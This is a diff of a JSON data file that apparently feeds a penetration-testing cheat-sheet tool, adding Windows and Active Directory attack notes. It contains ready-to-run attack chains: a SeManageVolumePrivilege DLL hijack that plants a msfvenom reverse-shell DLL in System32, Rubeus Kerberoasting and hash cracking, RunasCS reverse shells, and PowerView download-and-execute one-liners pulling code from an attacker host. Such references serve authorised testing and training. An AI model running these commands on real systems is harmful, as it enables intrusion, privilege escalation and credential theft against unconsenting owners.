+      "title": "SeManageVolumeExploit DLL Hijack",
+      "description": "Use `SeManageVolumeExploit` when the current Windows token has `SeManageVolumePrivilege`, then abuse the writable `C:\\` permissions to place a DLL payload in `System32\\wbem` and trigger it with `systeminfo`.",
+      "source": "Privilege Escalation/Windows Privilege Escalation.md",
+      "source_type": "markdown",
+      "tab": "Privesc",
+      "tags": [
+        "Shell",
+        "Windows",
+        "PrivilegeEscalation"
+      ],
+      "requires": [
+        "Shell"
+      ],
+      "services": [],
+      "attack_types": [
+        "PrivilegeEscalation"
+      ],
+      "target_types": [
+        "Windows"
+      ],
+      "outputs": [
+        "Admin",
+        "Services",
+        "Privileges"
+      ],
+      "next": [],
+      "command": "# Attacker: download the exploit first.\n# https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe\n\n# Target: transfer exploit to victim.\ncertutil -urlcache -split -f \"http://<LHOST>/SeManageVolumeExploit.exe\" SeManageVolumeExploit.exe\n\n# Target: run exploit.\nSeManageVolumeExploit.exe\n# Example output:\n# Entries changed: 925\n# DONE\n\n# Target: check the permission change.\nicacls C:\\\n# Example output:\n# BUILTIN\\Users:(OI)(CI)(F)\n\n# Attacker: create reverse-shell DLL payload.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o shell.dll\n\n# Target: place payload as tzres.dll in the System32 wbem directory.\ncertutil -urlcache -split -f \"http://<LHOST>/shell.dll\" \"C:\\Windows\\System32\\wbem\\tzres.dll\"\n\n# Attacker: start listener before triggering.\nnc -lvnp <LPORT>\n\n# Target: trigger DLL load.\nsysteminfo\n\n# Attacker shell: confirm callback context.\nwhoami\n# Example output:\n# nt authority\\network service",
+      "lang": "cmd"
     },
     {
       "id": "note-privilege-escalation-windows-privilege-escalation-md-10",
@@ -8833,7 +8935,7 @@
       "lang": "sh"
     },
     {
-      "id": "note-privilege-escalation-windows-privilege-escalation-md-20",
+      "id": "note-privilege-escalation-windows-privilege-escalation-md-21",
       "title": "UAC Bypass",
       "description": "Run the Fodhelper UAC bypass from disk or directly from an attacker web server.",
       "source": "Privilege Escalation/Windows Privilege Escalation.md",
@@ -11392,6 +11494,7 @@
       "title": "BloodHound Analysis",
       "source": "Active Directory/Bloodhound/BloodHound Analysis.md",
       "tab": "Active Directory",
+      "note_group": "Active Directory",
       "type": "note",
       "tags": [],
       "blocks": [
@@ -11425,6 +11528,38 @@
         {
           "type": "heading",
           "depth": 2,
+          "text": "Edge Cheat Sheet"
+        },
+        {
+          "type": "list",
+          "items": [
+            "`GenericAll` on group: add yourself or another principal to the target group.",
+            "`ForceChangePassword`: reset the target password, then validate access.",
+            "`WriteDACL`: grant yourself stronger rights such as DCSync.",
+            "`AddMember`: add yourself into a privileged group path.",
+            "Abuse commands live in [[../Privesc|AD Privesc To DA]].",
+            "After abuse, validate access and move laterally with [[../Lateral Movement]]."
+          ]
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "AD CS Review"
+        },
+        {
+          "type": "list",
+          "items": [
+            "`certipy find` = discover vulnerable templates / CA issues.",
+            "`certipy req` = request a certificate that gives you access.",
+            "`certipy auth` = turn a PFX into auth material.",
+            "`nxc smb ... -H` = quickly validate the recovered hash/access.",
+            "Enumeration commands live in [[../Post-Creds Enum]].",
+            "Exploitation commands live in [[../Privesc|AD Privesc To DA]]."
+          ]
+        },
+        {
+          "type": "heading",
+          "depth": 2,
           "text": "Cypher Queries"
         },
         {
@@ -11452,114 +11587,9 @@
           "type": "list",
           "items": [
             "Collection flow: [[../Post-Creds Enum]]",
-            "Edge abuse: [[Edges Privilege]]",
-            "AD CS abuse: [[Certification - ADCS]]",
-            "Full privesc pathing: [[Privesc]]"
-          ]
-        }
-      ]
-    },
-    {
-      "id": "note-active-directory-bloodhound-certification-adcs-md",
-      "title": "Certification - ADCS",
-      "source": "Active Directory/Bloodhound/Certification - ADCS.md",
-      "tab": "Active Directory",
-      "type": "note",
-      "tags": [
-        "ActiveDirectory",
-        "Enumeration",
-        "PrivilegeEscalation",
-        "Kerberos"
-      ],
-      "blocks": [
-        {
-          "type": "heading",
-          "depth": 2,
-          "text": "Focus"
-        },
-        {
-          "type": "list",
-          "items": [
-            "AD CS enum and exploitation commands are already covered in [[../Post-Creds Enum]] and [[../Privesc]].",
-            "This note keeps the attack path readable without duplicating the command blocks again."
-          ]
-        },
-        {
-          "type": "heading",
-          "depth": 2,
-          "text": "Quick Mental Model"
-        },
-        {
-          "type": "list",
-          "items": [
-            "`certipy find` = discover vulnerable templates / CA issues",
-            "`certipy req` = request a cert that gives you access",
-            "`certipy auth` = turn a PFX into auth material",
-            "`nxc smb ... -H` = quickly validate the recovered hash/access"
-          ]
-        },
-        {
-          "type": "heading",
-          "depth": 2,
-          "text": "Next"
-        },
-        {
-          "type": "list",
-          "items": [
-            "Enumeration step: [[../Post-Creds Enum]]",
-            "Privilege escalation step: [[Privesc]]"
-          ]
-        }
-      ]
-    },
-    {
-      "id": "note-active-directory-bloodhound-edges-privilege-md",
-      "title": "BloodHound Edges Privilege",
-      "source": "Active Directory/Bloodhound/Edges Privilege.md",
-      "tab": "Active Directory",
-      "type": "note",
-      "tags": [
-        "ActiveDirectory",
-        "PrivilegeEscalation",
-        "SMB"
-      ],
-      "blocks": [
-        {
-          "type": "heading",
-          "depth": 2,
-          "text": "Focus"
-        },
-        {
-          "type": "list",
-          "items": [
-            "The actual abuse commands now live in [[Privesc]].",
-            "This note is just a reminder of what each common edge usually means."
-          ]
-        },
-        {
-          "type": "heading",
-          "depth": 2,
-          "text": "Common Edges"
-        },
-        {
-          "type": "list",
-          "items": [
-            "`GenericAll` on group: add yourself or another principal to the target group",
-            "`ForceChangePassword`: reset the target password, then validate access",
-            "`WriteDACL`: grant yourself stronger rights such as DCSync",
-            "`AddMember`: add yourself into a privileged group path"
-          ]
-        },
-        {
-          "type": "heading",
-          "depth": 2,
-          "text": "Next"
-        },
-        {
-          "type": "list",
-          "items": [
-            "Abuse commands: [[Privesc]]",
-            "Validate access and move laterally: [[../Lateral Movement]]"
+            "Edge abuse: [[../Privesc|AD Privesc To DA]]",
+            "AD CS abuse: [[../Post-Creds Enum]] then [[../Privesc|AD Privesc To DA]]",
+            "Full privesc pathing: [[../Privesc|AD Privesc To DA]]"
           ]
         }
       ]
@@ -11569,6 +11599,7 @@
       "title": "AD LDAP Enum",
       "source": "Active Directory/Enumeration/LDAP Enum.md",
       "tab": "Active Directory",
+      "note_group": "Active Directory",
       "type": "note",
       "tags": [
         "ActiveDirectory",
@@ -11577,6 +11608,11 @@
         "Enumeration"
       ],
       "blocks": [
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Commands"
+        },
         {
           "type": "tagline",
           "tags": [
@@ -11735,6 +11771,7 @@
       "title": "AD SMB Enum",
       "source": "Active Directory/Enumeration/SMB Enum.md",
       "tab": "Active Directory",
+      "note_group": "Active Directory",
       "type": "note",
       "tags": [
         "ActiveDirectory",
@@ -11743,6 +11780,11 @@
         "Enumeration"
       ],
       "blocks": [
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Commands"
+        },
         {
           "type": "tagline",
           "tags": [
@@ -11917,6 +11959,7 @@
       "title": "AD Windows Enum",
       "source": "Active Directory/Enumeration/Windows Enum.md",
       "tab": "Active Directory",
+      "note_group": "Active Directory",
       "type": "note",
       "tags": [
         "ActiveDirectory",
@@ -11986,6 +12029,7 @@
       "title": "AD Initial Access",
       "source": "Active Directory/Initial Access.md",
       "tab": "Active Directory",
+      "note_group": "Active Directory",
       "type": "note",
       "tags": [
         "ActiveDirectory",
@@ -12078,6 +12122,30 @@
           "type": "code",
           "lang": "sh",
           "text": "# Option 1: users file.\nimpacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -no-pass -dc-ip <DC_IP> -outputfile asrep.hashes\n\n# Option 2: single known user.\nimpacket-GetNPUsers <DOMAIN>/<USER> -request -no-pass -dc-ip <DC_IP> -outputfile asrep.hashes\n\n# Crack ASREP hash.\nhashcat -m 18200 asrep.hashes <WORDLIST>"
+        },
+        {
+          "type": "heading",
+          "depth": 3,
+          "text": "Rubeus Kerberoast From Victim Shell"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Shell",
+            "Kerberos",
+            "Windows",
+            "ActiveDirectory",
+            "InitialAccess"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Request Kerberoastable TGS hashes from a domain-joined victim shell, then crack them offline. This is useful when you have code execution on a domain machine but do not yet have reusable domain credentials."
+        },
+        {
+          "type": "code",
+          "lang": "powershell",
+          "text": "# Target: download Rubeus.\ncertutil -urlcache -split -f http://<LHOST>/Rubeus.exe Rubeus.exe\n\n# Target: request Kerberoast hashes in hashcat format.\n.\\Rubeus.exe kerberoast /format:hashcat /nowrap\n\n# Attacker: save the captured TGS hash.\necho '$krb5tgs$MSSQLSvc/DC.access.offsec:670A' > svc_mssql\n\n# Attacker: crack the TGS hash.\nhashcat -m 13100 svc_mssql <WORDLIST>\n# Example output:\n# ....09a4:trustno1\n# svc_mssql : trustno1"
         },
         {
           "type": "heading",
@@ -12199,6 +12267,10 @@
           "text": "Responder / NTLM Relay"
         },
         {
+          "type": "paragraph",
+          "text": "Use this path when you can capture or relay Net-NTLM authentication from a victim."
+        },
+        {
           "type": "heading",
           "depth": 3,
           "text": "Responder Net-NTLMv2 Capture"
@@ -12285,6 +12357,7 @@
       "title": "AD Lateral Movement",
       "source": "Active Directory/Lateral Movement.md",
       "tab": "Active Directory",
+      "note_group": "Active Directory",
       "type": "note",
       "tags": [
         "ActiveDirectory",
@@ -12340,6 +12413,10 @@
           "text": "WinRM"
         },
         {
+          "type": "paragraph",
+          "text": "Prefer WinRM when it is enabled because it gives a clean interactive shell and file transfer options."
+        },
+        {
           "type": "heading",
           "depth": 3,
           "text": "WinRM With Evil-WinRM"
@@ -12385,7 +12462,7 @@
         {
           "type": "code",
           "lang": "powershell",
-          "text": "$username = '<USER>'\n$password = '<PASS>'\n$secureString = ConvertTo-SecureString $password -AsPlainText -Force\n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString\nNew-PSSession -ComputerName <TARGET_HOST> -Credential $credential\nEnter-PSSession 1"
+          "text": "# Build a PSCredential object.\n$username = '<USER>'\n$password = '<PASS>'\n$secureString = ConvertTo-SecureString $password -AsPlainText -Force\n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString\n\n# Create and enter the remote session.\nNew-PSSession -ComputerName <TARGET_HOST> -Credential $credential\nEnter-PSSession 1"
         },
         {
           "type": "heading",
@@ -12410,6 +12487,31 @@
           "type": "code",
           "lang": "cmd",
           "text": "# Open an interactive WinRS shell.\nwinrs -r:<TARGET_HOST> -u:<USER> -p:<PASS> cmd\n\n# Run a one-off command over WinRS.\nwinrs -r:<TARGET_HOST> -u:<USER> -p:<PASS> \"cmd /c hostname & whoami\"\n\n# Execute an encoded PowerShell payload over WinRS.\nwinrs -r:<TARGET_HOST> -u:<USER> -p:<PASS> \"powershell -nop -w hidden -e <BASE64_PAYLOAD>\""
+        },
+        {
+          "type": "heading",
+          "depth": 3,
+          "text": "RunasCS Spawn Process As Another User"
+        },
+        {
+          "type": "tagline",
+          "tags": [
+            "Username",
+            "Password",
+            "PowerShell",
+            "Windows",
+            "ActiveDirectory",
+            "LateralMovement"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Use RunasCS when you have another user's plaintext credentials and want to spawn a command or reverse shell as that user from an existing Windows shell."
+        },
+        {
+          "type": "code",
+          "lang": "powershell",
+          "text": "# Attacker reference:\n# https://raw.githubusercontent.com/antonioCoco/RunasCs/refs/heads/master/Invoke-RunasCs.ps1\n\n# Target: download and load RunasCS.\niwr http://<LHOST>/Invoke-RunasCs.ps1 -outfile Invoke-RunasCs.ps1\n. ./Invoke-RunasCs.ps1\n\n# Target: test command execution as the other user.\nInvoke-RunasCs -Username <USER> -Password '<PASS>' -Command \"whoami\"\n# Example output:\n# access\\svc_mssql\n\n# Attacker: generate a Windows reverse-shell payload.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe\n\n# Target: download the payload.\niwr http://<LHOST>/shell.exe -o shell.exe\n\n# Attacker: start listener before triggering.\nnc -lvnp <LPORT>\n\n# Target: spawn the payload as the other user.\nInvoke-RunasCs -Username <USER> -Password '<PASS>' -Command \"C:\\users\\public\\shell.exe\"\n\n# Attacker shell: confirm callback identity.\nwhoami\n# Example output:\n# access\\svc_mssql"
         },
         {
           "type": "heading",
@@ -12613,6 +12715,10 @@
           "text": "Subnet Reuse / Admin Checks"
         },
         {
+          "type": "paragraph",
+          "text": "After finding one valid credential/hash, sweep nearby hosts for local admin reuse."
+        },
+        {
           "type": "heading",
           "depth": 3,
           "text": "Subnet Reuse With Password"
@@ -12733,6 +12839,7 @@
       "title": "AD Attack Methodology",
       "source": "Active Directory/Methodology.md",
       "tab": "Active Directory",
+      "note_group": "Active Directory",
       "type": "methodology",
       "tags": [
         "ActiveDirectory",
@@ -12787,7 +12894,7 @@
             "First creds found: BloodHound, Kerberoast, LDAP/SMB enum.",
             "Local admin found: dump SAM/LSASS, then lateral movement.",
             "BloodHound path found: abuse edge in [[Privesc]].",
-            "AD CS vulnerable: use ESC path in [[Bloodhound/Certification - ADCS]].",
+            "AD CS vulnerable: review [[Bloodhound/BloodHound Analysis]] and use ESC path in [[Privesc]].",
             "DA achieved: run [[Post-DA]]."
           ]
         },
@@ -12812,6 +12919,7 @@
       "title": "AD Post-Creds Enum",
       "source": "Active Directory/Post-Creds Enum.md",
       "tab": "Active Directory",
+      "note_group": "Active Directory",
       "type": "note",
       "tags": [
         "ActiveDirectory",
@@ -12962,6 +13070,10 @@
           "text": "SMB / LDAP Enum"
         },
         {
+          "type": "paragraph",
+          "text": "Use SMB for shares/policy and LDAP for directory objects after the first valid domain credential."
+        },
+        {
           "type": "heading",
           "depth": 3,
           "text": "SMB Enum With NetExec"
@@ -13048,7 +13160,7 @@
         {
           "type": "code",
           "lang": "powershell",
-          "text": "(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1') | IEX\n\nGet-DomainController\nGet-DomainController | Select-Object Name\nFind-LocalAdminAccess\nGet-DomainGroup -Name \"Domain Admins\"\nGet-DomainUser\nGet-DomainGroup\nGet-DomainComputer | Select-Object dnshostname,operatingsystem\nGet-DomainGroupMember -Identity \"Domain Admins\"\nGet-DomainUser | Where-Object {$_.description} | Select-Object samaccountname,description\nFind-DomainShare -CheckShareAccess\nGet-DomainGPO\nGet-DomainTrust\nGet-DomainUser -SPN\nGet-DomainUser -PreauthNotRequired"
+          "text": "# Load PowerView in memory.\n(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1') | IEX\n\n# Domain overview and local-admin paths.\nGet-DomainController\nGet-DomainController | Select-Object Name\nFind-LocalAdminAccess\nGet-DomainGroup -Name \"Domain Admins\"\n\n# Users, groups, computers, and interesting attributes.\nGet-DomainUser\nGet-DomainGroup\nGet-DomainComputer | Select-Object dnshostname,operatingsystem\nGet-DomainGroupMember -Identity \"Domain Admins\"\nGet-DomainUser | Where-Object {$_.description} | Select-Object samaccountname,description\n\n# Shares, GPOs, trusts, and roastable users.\nFind-DomainShare -CheckShareAccess\nGet-DomainGPO\nGet-DomainTrust\nGet-DomainUser -SPN\nGet-DomainUser -PreauthNotRequired"
         },
         {
           "type": "heading",
@@ -13188,6 +13300,7 @@
       "title": "AD Post DA",
       "source": "Active Directory/Post-DA.md",
       "tab": "Active Directory",
+      "note_group": "Active Directory",
       "type": "note",
       "tags": [
         "ActiveDirectory",
@@ -13596,6 +13709,7 @@
       "title": "AD Privesc To DA",
       "source": "Active Directory/Privesc.md",
       "tab": "Active Directory",
+      "note_group": "Active Directory",
       "type": "note",
       "tags": [
         "ActiveDirectory",
@@ -13664,7 +13778,7 @@
         {
           "type": "code",
           "lang": "powershell",
-          "text": "(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1') | IEX\nGet-DomainGroup \"<GROUP>\"\nAdd-DomainGroupMember -Identity \"<GROUP>\" -Members <USER>\nGet-DomainGroupMember \"<GROUP>\""
+          "text": "# Load PowerView in memory.\n(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1') | IEX\n\n# Inspect the group, add the controlled user, and verify membership.\nGet-DomainGroup \"<GROUP>\"\nAdd-DomainGroupMember -Identity \"<GROUP>\" -Members <USER>\nGet-DomainGroupMember \"<GROUP>\""
         },
         {
           "type": "heading",
@@ -14191,6 +14305,7 @@
       "title": "AD Recon",
       "source": "Active Directory/Recon.md",
       "tab": "Active Directory",
+      "note_group": "Active Directory",
       "type": "note",
       "tags": [
         "ActiveDirectory",
@@ -14241,6 +14356,10 @@
           "text": "DC Discovery"
         },
         {
+          "type": "paragraph",
+          "text": "Use DNS first to identify the domain controller and confirm the domain naming context."
+        },
+        {
           "type": "heading",
           "depth": 3,
           "text": "DC Discovery With Dig"
@@ -14288,6 +14407,10 @@
           "type": "heading",
           "depth": 3,
           "text": "Port Scan"
+        },
+        {
+          "type": "paragraph",
+          "text": "Scan the suspected DC for core AD services before moving into LDAP/SMB/Kerberos enum."
         },
         {
           "type": "heading",
@@ -14394,6 +14517,7 @@
       "title": "AD Checklist",
       "source": "Checklists/AD Checklist.md",
       "tab": "Checklists",
+      "note_group": "Checklists",
       "type": "checklist",
       "tags": [
         "ActiveDirectory",
@@ -14556,6 +14680,7 @@
       "title": "Enumeration Checklist",
       "source": "Checklists/Enumeration Checklist.md",
       "tab": "Checklists",
+      "note_group": "Checklists",
       "type": "checklist",
       "tags": [
         "Enumeration"
@@ -14578,6 +14703,7 @@
       "title": "If Stuck",
       "source": "Checklists/If Stuck.md",
       "tab": "Checklists",
+      "note_group": "Checklists",
       "type": "checklist",
       "tags": [
         "Troubleshooting",
@@ -14676,15 +14802,15 @@
         {
           "type": "list",
           "items": [
-            "HackTricks: https://book.hacktricks.xyz",
-            "GTFOBins (Linux LPE): https://gtfobins.github.io",
-            "LOLBAS (Windows LPE): https://lolbas-project.github.io",
-            "Revshells Generator: https://www.revshells.com",
-            "PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings",
-            "CyberChef: https://gchq.github.io/CyberChef",
-            "ExploitDB: https://www.exploit-db.com",
-            "ired.team: https://www.ired.team",
-            "0xdf HTB writeups: https://0xdf.gitlab.io"
+            "[HackTricks](https://book.hacktricks.xyz)",
+            "[GTFOBins - Linux LPE](https://gtfobins.github.io)",
+            "[LOLBAS - Windows LPE](https://lolbas-project.github.io)",
+            "[Revshells Generator](https://www.revshells.com)",
+            "[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)",
+            "[CyberChef](https://gchq.github.io/CyberChef)",
+            "[ExploitDB](https://www.exploit-db.com)",
+            "[ired.team](https://www.ired.team)",
+            "[0xdf HTB writeups](https://0xdf.gitlab.io)"
           ]
         }
       ]
@@ -14694,6 +14820,7 @@
       "title": "Linux Checklist",
       "source": "Checklists/Linux Checklist.md",
       "tab": "Checklists",
+      "note_group": "Checklists",
       "type": "checklist",
       "tags": [
         "Linux",
@@ -14828,6 +14955,7 @@
       "title": "Web Checklist",
       "source": "Checklists/Web Checklist.md",
       "tab": "Checklists",
+      "note_group": "Checklists",
       "type": "checklist",
       "tags": [
         "HTTP",
@@ -14918,6 +15046,7 @@
       "title": "Windows Checklist",
       "source": "Checklists/Windows Checklist.md",
       "tab": "Checklists",
+      "note_group": "Checklists",
       "type": "checklist",
       "tags": [
         "Windows",
@@ -15068,6 +15197,7 @@
       "title": "Hash Crack",
       "source": "Credentials/Hash Crack.md",
       "tab": "Credentials",
+      "note_group": "Credentials",
       "type": "tool-note",
       "tags": [
         "Credentials",
@@ -15115,9 +15245,16 @@
           "text": "Quickly check common hashes online when exam/network rules allow it, before spending time on full cracking."
         },
         {
-          "type": "code",
-          "lang": "text",
-          "text": "CrackStation: https://crackstation.net\nHashes.com: https://hashes.com/en/decrypt/hash\nMD5Decrypt: https://md5decrypt.net\n\nBest for MD5, SHA1, NTLM, and other common-password hashes."
+          "type": "list",
+          "items": [
+            "[CrackStation](https://crackstation.net)",
+            "[Hashes.com](https://hashes.com/en/decrypt/hash)",
+            "[MD5Decrypt](https://md5decrypt.net)"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Best for MD5, SHA1, NTLM, and other common-password hashes."
         },
         {
           "type": "heading",
@@ -15466,6 +15603,7 @@
       "title": "LDAP Enum",
       "source": "Enumeration/LDAP Enum.md",
       "tab": "Enum",
+      "note_group": "Enum",
       "type": "note",
       "tags": [
         "LDAP",
@@ -15520,6 +15658,7 @@
       "title": "Nmap",
       "source": "Enumeration/Nmap.md",
       "tab": "Enum",
+      "note_group": "Enum",
       "type": "note",
       "tags": [
         "Enumeration"
@@ -15592,6 +15731,7 @@
       "title": "Passive Enumeration",
       "source": "Enumeration/Passive.md",
       "tab": "Enum",
+      "note_group": "Enum",
       "type": "note",
       "tags": [
         "Enumeration"
@@ -15629,6 +15769,7 @@
       "title": "SMB Enum",
       "source": "Enumeration/SMB Enum.md",
       "tab": "Enum",
+      "note_group": "Enum",
       "type": "note",
       "tags": [
         "SMB",
@@ -15684,6 +15825,7 @@
       "title": "Web Enumeration",
       "source": "Enumeration/Web.md",
       "tab": "Enum",
+      "note_group": "Web",
       "type": "note",
       "tags": [
         "HTTP",
@@ -15806,7 +15948,7 @@
         {
           "type": "code",
           "lang": "sh",
-          "text": "git clone https://github.com/tismayil/ohmybackup.git\ncd ohmybackup\ngo run ohmybackup.go --hostname <TARGET_HOST>\ngo build ohmybackup.go\n./ohmybackup --hostname <TARGET_HOST>"
+          "text": "# Install or update ohmybackup locally.\ngit clone https://github.com/tismayil/ohmybackup.git\ncd ohmybackup\n\n# Run directly or build a local binary.\ngo run ohmybackup.go --hostname <TARGET_HOST>\ngo build ohmybackup.go\n./ohmybackup --hostname <TARGET_HOST>"
         },
         {
           "type": "heading",
@@ -15827,7 +15969,7 @@
         {
           "type": "code",
           "lang": "sh",
-          "text": "nikto -h http://<TARGET_IP>\nnikto -h https://<TARGET_IP> -ssl\nnikto -h http://<TARGET_IP> -p <PORT> -o nikto.txt\nnikto -h http://<TARGET_IP> -Format html -o nikto.html"
+          "text": "# Basic HTTP/HTTPS scans.\nnikto -h http://<TARGET_IP>\nnikto -h https://<TARGET_IP> -ssl\n\n# Scan a specific port and save reports.\nnikto -h http://<TARGET_IP> -p <PORT> -o nikto.txt\nnikto -h http://<TARGET_IP> -Format html -o nikto.html"
         },
         {
           "type": "heading",
@@ -15869,7 +16011,7 @@
         {
           "type": "code",
           "lang": "sh",
-          "text": "nuclei -update-templates\nnuclei -u http://<TARGET_IP>\nnuclei -u http://<TARGET_IP> -severity critical,high\nnuclei -u http://<TARGET_IP> -t cves/2021/\nnuclei -u http://<TARGET_IP> -t exposures/configs/\nnuclei -l targets.txt -severity high,critical -o nuclei-results.txt"
+          "text": "# Update templates, then run quick and focused scans.\nnuclei -update-templates\nnuclei -u http://<TARGET_IP>\nnuclei -u http://<TARGET_IP> -severity critical,high\n\n# Target specific template groups or a target list.\nnuclei -u http://<TARGET_IP> -t cves/2021/\nnuclei -u http://<TARGET_IP> -t exposures/configs/\nnuclei -l targets.txt -severity high,critical -o nuclei-results.txt"
         },
         {
           "type": "heading",
@@ -15983,7 +16125,109 @@
         {
           "type": "code",
           "lang": "sh",
-          "text": "wpscan --url http://<TARGET_IP>\nwpscan --url http://<TARGET_IP> --enumerate u,p,t\nwpscan --url http://<TARGET_IP> --enumerate vp --api-token <TOKEN>"
+          "text": "# Scan the site first.\nwpscan --url http://<TARGET_IP>\n\n# Enumerate users, plugins, themes, and vulnerable plugins.\nwpscan --url http://<TARGET_IP> --enumerate u,p,t\nwpscan --url http://<TARGET_IP> --enumerate vp --api-token <TOKEN>"
+        }
+      ]
+    },
+    {
+      "id": "note-log-md",
+      "title": "Log",
+      "source": "Log.md",
+      "tab": "Enum",
+      "note_group": "Enum",
+      "type": "log",
+      "tags": [],
+      "blocks": [
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Moved"
+        },
+        {
+          "type": "heading",
+          "depth": 3,
+          "text": "2026-04-30"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Ligolo-NG localhost forward with `listener_add`, MSSQL example output, and a setup-pivot link -> `Pivoting/Tunnelling.md` under `Ligolo-ng Localhost Forward`.",
+            "Chisel reverse port forward examples for target-local MSSQL and web services -> `Pivoting/Tunnelling.md` under `Chisel Reverse Port Forward`.",
+            "SSH local and remote forwarding examples for MSSQL, web, and MySQL -> `Pivoting/Tunnelling.md` under `SSH Local / Remote Forward`.",
+            "Socat Linux port-forward examples for MySQL and web services -> `Pivoting/Tunnelling.md` under `Socat`."
+          ]
+        },
+        {
+          "type": "heading",
+          "depth": 3,
+          "text": "2026-04-29"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Ligolo-ng pivot workflow -> `Pivoting/Tunnelling.md` under `Ligolo-ng Pivot`.",
+            "`windows.old` SAM/SYSTEM backup search -> `Post-Exploitation/Windows Post-Exploitation.md` under `Files And Loot - Windows.old Hives`.",
+            "Enable RDP after admin remote command execution -> `Post-Exploitation/Windows Post-Exploitation.md` under `Enable RDP`.",
+            "DCC2 / MSCache v2 cracking example -> `Credentials/Hash Crack.md` under `Other Windows Hashes - MSCache And SCCM PXE`.",
+            "Penelope shell/session manager commands -> `Post-Exploitation/Full Interactive Shell.md` under `Penelope Session Manager`.",
+            "Classic `enum4linux` user extraction, description review, and lockout check -> `Enumeration/Services/135, 445 - SMB.md` under `Enum4linux Classic User Extraction`.",
+            "SMB `spider_plus` and one-shot share download -> `Enumeration/Services/135, 445 - SMB.md` under `Loot Shares`.",
+            "Kerbrute valid-user extraction -> `Active Directory/Initial Access.md` under `User Enumeration`.",
+            "LDAP `--users` output cleanup -> `Active Directory/Post-Creds Enum.md` under `LDAP Enum With NetExec`.",
+            "BloodHound collection with NTLM hash -> `Active Directory/Post-Creds Enum.md` under `BloodHound Collection`.",
+            "LAPS query commands -> `Active Directory/Post-Creds Enum.md` under `LAPS Query`.",
+            "Offline NTDS hash extraction, cracking, and hash spray -> `Active Directory/Post-DA.md` under `NTDS Hash Spray`.",
+            "RBCD with NTLM hash chain -> `Active Directory/Privesc.md` under `RBCD With NTLM Hash`.",
+            "MSSQL login impersonation and database credential looting -> `Active Directory/Privesc.md` under `MSSQL Login Impersonation Credential Loot`.",
+            "TargetedKerberoast to ForceChangePassword/RDP chain -> `Active Directory/Privesc.md` under `Targeted Kerberoast To ForceChangePassword`.",
+            "Local-only MSSQL via Chisel, Silver Ticket, `xp_cmdshell`, and SigmaPotato -> `Active Directory/Privesc.md` under `MSSQL Local-Only Silver Ticket Chain`.",
+            "Server Operators service `binPath` abuse -> `Privilege Escalation/Windows Privilege Escalation.md` under `Server Operators Service Abuse`.",
+            "`nagoyaspray` seasonal wordlist workflow -> `Initial Access/Password Guessing.md` under `Nagoyaspray Seasonal Wordlist`.",
+            "MySQL leaked credential database access and admin password reset -> `Enumeration/Services/3306 - MySQL.md`.",
+            "Penelope uploaded webshell trigger -> `Post-Exploitation/Full Interactive Shell.md` under `Penelope Session Manager`.",
+            "`pspy64` process credential leakage -> `Privilege Escalation/Linux Privilege Escalation.md` under `Process Credential Leakage With pspy`.",
+            "`sudo /usr/bin/flask_password_changer` app hijack -> `Privilege Escalation/Linux Privilege Escalation.md` under `Sudo Flask Password Changer App Hijack`.",
+            "AD \"if stuck\" BloodHound/LAPS/RDP reminders -> `Checklists/If Stuck.md` under `AD Privesc / Post-Exploitation`.",
+            "WebDAV `http-webdav-scan` and authenticated ASPX upload with `curl` -> `Enumeration/Web.md` under `WebDAV Upload`.",
+            "Nmap quick/full/UDP variants -> `Enumeration/Nmap.md`.",
+            "SMBMap credentialed share access, SMB pass-the-hash client, and RID brute username extraction -> `Enumeration/Services/135, 445 - SMB.md`.",
+            "Windows/Linux file transfer variants including SCP, certutil, BITSAdmin, and PowerShell in-memory load -> `Post-Exploitation/File Transfer.md`.",
+            "MSFvenom payload variants, Python reverse shell, and Windows HTTPS handler -> `Payloads/Reverse Shells.md`.",
+            "Protected file cracking helpers for ZIP, 7z, PDF, Office, and KeePass -> `Credentials/Hash Crack.md`.",
+            "Certipy AD CS discovery and ESC1 request/auth flow -> `Active Directory/Post-Creds Enum.md` and `Active Directory/Privesc.md`.",
+            "Evil-WinRM pass-the-hash -> `Active Directory/Lateral Movement.md`.",
+            "PostgreSQL connect, quick enum, and Hydra check -> `Enumeration/Services/5432 - PostgreSQL.md`.",
+            "SQL Injection methodology and payload notes -> `Exploitation/SQL Injection.md`.",
+            "LAPS installed check, LDAP `ms-Mcs-AdmPwd` query, and recovered local admin validation -> `Active Directory/Post-Creds Enum.md` under `LAPS Query`.",
+            "Winlogon AutoLogon credential check -> `Privilege Escalation/Windows Privilege Escalation.md` under `Winlogon Saved Credentials`.",
+            "PowerView user-description credential hunting -> `Active Directory/Post-Creds Enum.md` under `PowerView`.",
+            "NetExec relay target-list generation -> `Active Directory/Initial Access.md` under `NTLM Relay With SMB Signing Disabled`.",
+            "Silver Ticket prep commands for SID lookup and service-account hash discovery -> `Active Directory/Post-DA.md` under `Silver Tickets`.",
+            "LAPS installed check, LDAP `ms-Mcs-AdmPwd` query, and recovered local admin validation with example output -> `Active Directory/Post-Creds Enum.md` under `LAPS Query`."
+          ]
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Skipped / Already Covered"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Kerberoast and AS-REP roast basics already exist in Active Directory notes and hash-cracking notes.",
